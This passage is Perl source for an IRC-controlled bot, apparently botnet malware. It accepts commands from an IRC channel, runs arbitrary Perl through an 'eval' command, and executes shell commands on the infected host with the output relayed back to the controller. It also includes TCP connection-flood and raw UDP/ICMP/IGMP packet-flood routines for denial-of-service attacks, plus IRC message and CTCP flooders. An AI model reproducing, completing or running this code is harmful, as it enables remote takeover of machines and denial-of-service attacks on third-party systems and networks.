if ($case =~ /^flood\s+(\d+)\s+(\S+) (.*)/) {
for (my $cf = 1; $cf <= $1; $cf++) {
msg("$2", "$3");
}
}

if ($case =~ /^ctcp\s+(\S+) (.*)/) {
ctcp("$1", "$2");
}

if ($case =~ /^ctcpflood\s+(\d+)\s+(\S+) (.*)/) {
for (my $cf = 1; $cf <= $1; $cf++) {
ctcp("$2", "$3");
}
}

if ($case =~ /^nick (.*)/) {
nick("$1");
}

if ($case =~ /^connect\s+(\S+)\s+(\S+)/) {
conectar("$2", "$1", 6667);
}

if ($case =~ /^raw (.*)/) {
sendraw("$1");
}

if ($case =~ /^eval (.*)/) {
eval "$1";
}
}

sub shell {
my $printl=$_[0];
my $comando=$_[1];
if ($comando =~ /cd (.*)/) {
chdir("$1") || msg("$printl", "No such file or directory");
return;
}

elsif ($pid = fork) {
waitpid($pid, 0);
}
else {
if (fork) {
exit;

} else {
my @resp=`$comando 2>&1 3>&1`;
my $c=0;
foreach my $linha (@resp) {
  $c++;
  chop $linha;
  sendraw($IRC_cur_socket, "PRIVMSG $printl :$linha");
  if ($c == "$linas_max") {
    $c=0;
    sleep $sleep;
  }
}
exit;
}
}
}

sub tcpflooder {
my $itime = time;
my ($cur_time);
my ($ia,$pa,$proto,$j,$l,$t);
$ia=inet_aton($_[0]);
$pa=sockaddr_in($_[1],$ia);
$ftime=$_[2];
$proto=getprotobyname('tcp');
$j=0;$l=0;
$cur_time = time - $itime;
while ($l<1000){
$cur_time = time - $itime;
last if $cur_time >= $ftime;
$t="SOCK$l";
socket($t,PF_INET,SOCK_STREAM,$proto);
connect($t,$pa)||$j--;
$j++;$l++;
}
$l=0;
while ($l<1000){
$cur_time = time - $itime;
last if $cur_time >= $ftime;
$t="SOCK$l";
shutdown($t,2);
$l++;
}
}

sub udpflooder {
my $iaddr = inet_aton($_[0]);
my $msg = 'A' x $_[1];
my $ftime = $_[2];
my $cp = 0;
my (%pacotes);
$pacotes{icmp} = $pacotes{igmp} = $pacotes{udp} = $pacotes{o} = $pacotes{tcp} = 0;
socket(SOCK1, PF_INET, SOCK_RAW, 2) or $cp++;
socket(SOCK2, PF_INET, SOCK_DGRAM, 17) or $cp++;
socket(SOCK3, PF_INET, SOCK_RAW, 1) or $cp++;
socket(SOCK4, PF_INET, SOCK_RAW, 6) or $cp++;
return(undef) if $cp == 4;
my $itime = time;
my ($cur_time);
while ( 1 ) {
for (my $porta = 1;
$porta <= 65000; $porta++) {
$cur_time = time - $itime;
last if $cur_time >= $ftime;
send(SOCK1, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{igmp}++;
send(SOCK2, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{udp}++;
send(SOCK3, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{icmp}++;
send(SOCK4, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{tcp}++;


for (my $pc = 3;
$pc <= 255;$pc++) {
next if $pc == 6;
$cur_time = time - $itime;
last if $cur_time >= $ftime;
socket(SOCK5, PF_INET, SOCK_RAW, $pc) or next;
send(SOCK5, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{o}++;
}
}
last if $cur_time >= $ftime;
}
return($cur_time, %pacotes);
}

sub ctcp {
return unless $#_ == 1;
sendraw("PRIVMSG $_[0] :\001$_[1]\001");
}

sub msg {
return unless $#_ == 1;
sendraw("PRIVMSG $_[0] :$_[1]");
}

sub notice {
return unless $#_ == 1;
sendraw("NOTICE $_[0] :$_[1]");
}

sub op {
return unless $#_ == 1;
sendraw("MODE $_[0] +o $_[1]");
}

sub deop {
return unless $#_ == 1;
sendraw("MODE $_[0] -o $_[1]");
}

sub j {
&join(@_);
}

sub join {
return unless $#_ == 0;
sendraw("JOIN $_[0]");

}
sub p { part(@_);
}

sub part {
sendraw("PART $_[0]");
}

sub nick {
return unless $#_ == 0;
sendraw("NICK $_[0]");
}

sub quit {
sendraw("QUIT $_[0]");
}

}
#ionlyknownothing#

